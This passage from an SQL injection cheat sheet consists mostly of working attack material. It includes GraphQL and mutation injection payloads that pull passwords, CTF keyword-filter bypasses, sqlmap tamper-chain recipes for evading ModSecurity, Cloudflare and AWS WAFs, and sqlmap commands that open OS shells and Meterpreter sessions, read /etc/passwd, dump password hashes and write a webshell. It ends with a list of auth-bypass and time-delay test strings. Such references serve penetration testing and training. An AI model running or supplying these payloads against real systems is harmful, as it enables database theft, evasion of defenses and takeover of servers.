{ users(orderBy: "name ASC; WAITFOR DELAY '0:0:5'--") { id } }

# limit / offset
{ users(limit: "1 UNION SELECT username,password FROM admins--") { id } }

# search / full-text
{ search(query: "test' AND 1=CONVERT(int,(SELECT TOP 1 password FROM users))--") { id } }
```

### Mutation Injection

Mutations map to INSERT/UPDATE/DELETE — test all input fields:

```graphql
mutation {
  createUser(input: {
    name: "test',(SELECT password FROM users LIMIT 1))-- -"
    email: "a@b.com"
  }) {
    id
  }
}
```

### Introspection + SQLi Recon

Use introspection to enumerate all arguments that might flow to SQL:

```graphql
{
  __schema {
    types {
      name
      fields {
        name
        args { name type { name } }
      }
    }
  }
}
```

Look for args named: `id`, `filter`, `where`, `search`, `orderBy`, `sort`, `limit`, `offset` — these commonly map to SQL clauses.

### SQLMap with GraphQL

```bash
# Inline parameter marking:
sqlmap -u "https://target.com/graphql" \
  --data='{"query":"{ user(id: \"1*\") { name } }"}' \
  --content-type="application/json" \
  --technique=BEUST \
  --tamper=space2comment

# Via saved request file (recommended for complex queries):
sqlmap -r graphql_request.txt -p "id" --dbms=postgresql
```

---

## 24. CTF-ORIENTED TECHNIQUES

### handler (bypass SELECT filter)
```sql
-- When SELECT is blocked (MySQL-specific):
handler `table_name` open as a;
handler `a` read next;
handler `a` close;
```

### prepare + hex (bypass keyword filters)
```sql
SET @a=0x73656C65637420757365722C70617373776F72642066726F6D207573657273;
-- hex of: select user,password from users
PREPARE execsql FROM @a;
EXECUTE execsql;
```

### innodb_table_stats (bypass information_schema filter)
```sql
-- When 'information_schema' or 'or' is filtered:
SELECT table_name FROM mysql.innodb_table_stats WHERE database_name=database()
```

### No-column-name Injection
```sql
-- When column names are unknown:
SELECT `1` FROM (SELECT 1,2,3 UNION SELECT * FROM users)a
-- Backtick numbers correspond to column positions
SELECT `3` FROM (SELECT 1,2,3 UNION SELECT * FROM target_table)a LIMIT 1,1
```

### Double-write Bypass
```sql
-- When keywords are removed once:
uunionnion sselectelect ffromrom
-- After filter removes: union select from
```

### XOR Blind Injection
```sql
-- When most operators are filtered but ^ remains:
id=1^(ascii(substr((select(flag)from(flag)),1,1))>100)^1
```

### PIPES_AS_CONCAT Mode
```sql
-- When || is not filtered:
SET sql_mode=PIPES_AS_CONCAT;
SELECT 1||flag FROM flag
-- || acts as string concatenation instead of OR
```

### Rename/Alter Table Trick
```sql
-- Rename flag table to match app's expected query:
ALTER TABLE flag RENAME TO words;
ALTER TABLE words ADD COLUMN id INT DEFAULT 1;
-- App query: SELECT * FROM words WHERE id=1 → returns flag data
```

### group_concat Alternative
```sql
-- When group_concat is filtered, use GROUP BY with error:
SELECT COUNT(*), CONCAT((SELECT database()), FLOOR(RAND()*2)) x FROM information_schema.tables GROUP BY x
```

---

## 25. SQLMAP — ADVANCED WORKFLOW

### 25.1 Tamper Scripts Matrix

Tamper scripts modify payloads to evade WAF/IDS. Stack multiple with commas.

| Tamper | Effect | Target |
|---|---|---|
| `space2comment` | `SELECT/**/username` | WAFs blocking literal spaces |
| `space2plus` | `SELECT+username` | URL-encoded space filters |
| `space2hash` | `SELECT%23%0ausername` | MySQL — `#\n` acts as space |
| `space2mssqlblank` | Replaces space with random blank chars (`%00`–`%0F`) | MSSQL |
| `space2morehash` | More aggressive `#\n` padding | MySQL behind strict WAF |
| `between` | `NOT BETWEEN 0 AND` instead of `>` | WAFs blocking comparison operators |
| `charencode` | URL-encodes all characters | Generic evasion |
| `chardoubleencode` | Double URL-encode | Proxies that decode once before WAF |
| `randomcase` | `SeLeCt` | Case-sensitive WAF rules |
| `randomcomments` | `SEL/**/ECT` | Signature-based WAFs |
| `equaltolike` | `=` → `LIKE` | WAFs blocking `=` |
| `greatest` | `>` → `GREATEST(val,X)=val` | Operator-blocking WAFs |
| `ifnull2ifisnull` | `IFNULL` → `IF(ISNULL(...))` | MySQL-specific WAFs |
| `modsecurityversioned` | `/*!50000SELECT*/` | ModSecurity CRS on MySQL |
| `modsecurityzeroversioned` | `/*!00000SELECT*/` | ModSecurity with lax version matching |
| `unionalltounion` | `UNION ALL SELECT` → `UNION SELECT` | Rules specific to `UNION ALL` |
| `percentage` | Insert `%` between chars: `S%E%L%E%C%T` | IIS/ASP classic |
| `appendnullbyte` | Append `%00` | Language-level null-byte truncation |
| `halfversionedmorekeywords` | `/*!0SELECT*/` | MySQL version comment trick |
| `base64encode` | Base64-encode entire payload | Custom decoders |
| `symboliclogical` | `AND` → `&&`, `OR` → `||` | Keyword-based WAFs |
| `versionedkeywords` | `/*!SELECT*/` | MySQL versioned comments |
| `versionedmorekeywords` | More keywords wrapped in `/*!*/` | MySQL extended |
| `bluecoat` | Replace space after SQL keyword with `%09` | Blue Coat ProxySG |
| `sp_password` | Append `--sp_password` at end | MSSQL log hiding |

### 25.2 WAF Bypass Tamper Chain Recipes

```bash
# MySQL behind ModSecurity CRS
sqlmap -u "$URL" --tamper=space2comment,between,randomcase,modsecurityversioned

# MySQL behind Cloudflare
sqlmap -u "$URL" --tamper=space2comment,charencode,randomcase,between

# MSSQL behind IIS + generic WAF
sqlmap -u "$URL" --tamper=space2mssqlblank,randomcase,charencode,sp_password

# Oracle behind enterprise WAF
sqlmap -u "$URL" --tamper=between,randomcase,charencode

# Double-proxy (decode-once WAF in front)
sqlmap -u "$URL" --tamper=chardoubleencode,space2comment,randomcase

# IIS/ASP with percentage filter
sqlmap -u "$URL" --tamper=percentage,space2comment,randomcase

# PostgreSQL behind strict keyword WAF
sqlmap -u "$URL" --tamper=space2comment,between,randomcase,symboliclogical
```

### 25.3 --technique Flags

Control which injection techniques SQLMap tries:

| Flag | Technique | When |
|---|---|---|
| `B` | Boolean-based blind | Default first-try; conditional response diff |
| `E` | Error-based | Visible SQL errors in response |
| `U` | UNION query-based | Inline data extraction, fastest |
| `S` | Stacked queries | Multi-statement support (MSSQL, PostgreSQL) |
| `T` | Time-based blind | No visible diff; last resort |
| `Q` | Inline queries | Subquery within another statement |

```bash
# Only try UNION and error-based (fast, less noise):
sqlmap -u "$URL" --technique=UE

# Stacked queries for MSSQL xp_cmdshell:
sqlmap -u "$URL" --technique=S --os-shell

# Blind-only (stealthy recon):
sqlmap -u "$URL" --technique=BT
```

### 25.4 --risk and --level Combinations

| Level (1-5) | Effect |
|---|---|
| 1 | Default; tests GET/POST params |
| 2 | Also tests Cookie values |
| 3 | Also tests User-Agent, Referer |
| 4 | More payloads per parameter |
| 5 | All parameters, all headers, all payload variants |

| Risk (1-3) | Effect |
|---|---|
| 1 | Default; harmless payloads |
| 2 | Adds heavy time-based payloads |
| 3 | Adds `OR`-based payloads (may alter data — UPDATE/DELETE risk) |

```bash
# Thorough scan (headers, cookies, aggressive payloads):
sqlmap -u "$URL" --level=5 --risk=3

# Stealthy initial recon:
sqlmap -u "$URL" --level=2 --risk=1

# Cookie injection focus:
sqlmap -u "$URL" --level=2 --cookie="token=abc*" --risk=2
```

### 25.5 Second-Order Injection (--second-url)

```bash
# Inject into registration form, observe result on profile page:
sqlmap -u "https://target.com/register" \
  --data="username=test*&password=pass" \
  --second-url="https://target.com/profile" \
  --second-req="second_request.txt"

# --second-url: URL where injected payload manifests
# --second-req: full request file for the second URL (optional)
```

### 25.6 OS-Level Exploitation

```bash
# Interactive OS shell (requires stacked queries + priv):
sqlmap -u "$URL" --os-shell
# Tries: xp_cmdshell (MSSQL), UDF (MySQL), PL/Python (PostgreSQL)

# Meterpreter session:
sqlmap -u "$URL" --os-pwn
# Uploads stager, connects to Metasploit handler

# Read server files:
sqlmap -u "$URL" --file-read="/etc/passwd"

# Write webshell:
sqlmap -u "$URL" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# Specific DBMS for UDF path:
sqlmap -u "$URL" --os-shell --dbms=mysql
```

### 25.7 Useful Flags Reference

```bash
# Force DBMS to skip fingerprinting:
--dbms=mysql|mssql|oracle|pgsql|sqlite

# Proxy through Burp:
--proxy="http://127.0.0.1:8080"

# Custom injection marker:
--data="id=1*"  # * marks the injection point

# JSON body:
sqlmap -u "$URL" --data='{"id":"1*"}' --content-type="application/json"

# WAF detection & identify:
--identify-waf

# Skip URL encoding (for raw-socket evasion):
--skip-urlencode

# Specify prefix/suffix for custom contexts:
--prefix="')" --suffix="-- -"

# Verbose output for debugging tamper chains:
-v 3

# Dump with specific charset (faster brute-force):
--charset="0123456789abcdef"

# Threads for faster blind extraction:
--threads=8

# Flush session to re-test:
--flush-session
```

### 25.8 SQLMap Command Combos Cheat Sheet

```bash
# Full auto with WAF evasion, blind detection, and OS shell:
sqlmap -u "$URL" -p "id" --dbms=mysql --level=5 --risk=3 \
  --tamper=space2comment,between,randomcase \
  --technique=BEUST --threads=8 --os-shell

# POST JSON API with custom headers:
sqlmap -u "$URL" --data='{"user_id":"1*"}' \
  --content-type="application/json" \
  -H "Authorization: Bearer TOKEN" \
  --tamper=charencode --technique=BT

# Cookie-based injection:
sqlmap -u "$URL" --cookie="id=1*" --level=2 --risk=2

# Second-order:
sqlmap -r register.txt --second-url="https://target.com/profile"

# Read password hashes:
sqlmap -u "$URL" -p "id" --passwords --threads=8

# Dump specific table:
sqlmap -u "$URL" -D dbname -T users -C username,password --dump

# Enumerate privileges:
sqlmap -u "$URL" --privileges --roles
```

---

## 26. WAF BYPASS — ADVANCED TAMPER CHAIN PATTERNS

### ModSecurity CRS v3 Bypass Recipes

```sql
-- Paranoia Level 1 (default):
/*!50000SELECT*/ /*!50000username*/ /*!50000FROM*/ /*!50000users*/

-- Paranoia Level 2:
%53%45%4C%45%43%54/**/username/**/FROM/**/users

-- Combine tampers:
-- sqlmap --tamper=modsecurityversioned,space2comment,randomcase,between
```

### Cloudflare Bypass Patterns

```sql
-- Inline comment with version:
/*!50000UniOn*/ /*!50000SeLeCt*/ 1,2,3

-- Newline injection:
%0aSELECT%0a*%0aFROM%0ausers

-- Tabulation:
%09UNION%09SELECT%09*%09FROM%09users
```

### AWS WAF Bypass

```sql
-- JSON-based SQLi (if Content-Type: application/json):
{"id": "1 AND 1=1"}

-- Chunked transfer encoding can split payloads across chunks
-- Some WAFs don't reassemble before inspection
```

### Multi-Layer Encoding

```sql
-- Double URL encode (proxy decodes once, app decodes again):
%2527 → %27 → '

-- Unicode normalization attacks:
ʼ (U+02BC) → ' in some normalizers
＇(U+FF07) → ' in some normalizers

-- Mixed encoding:
%53ELECT → SELECT (partial encoding)
```

---

## 27. QUICK REFERENCE — INJECTION TEST STRINGS

```
'                          -- break string context
''                         -- escaped quote (test handling)
' OR 1=1--                 -- auth bypass attempt  
' OR 'a'='a               -- alternate auth bypass
'; SELECT 1--             -- statement termination
' UNION SELECT NULL--     -- UNION test
' AND 1=1--               -- boolean true
' AND 1=2--               -- boolean false (different response → injectable)
1; WAITFOR DELAY '0:0:3'-- -- MSSQL time delay
1 AND SLEEP(3)--          -- MySQL time delay
1 AND 1=dbms_pipe.receive_message(('a'),3)-- -- Oracle time delay
```
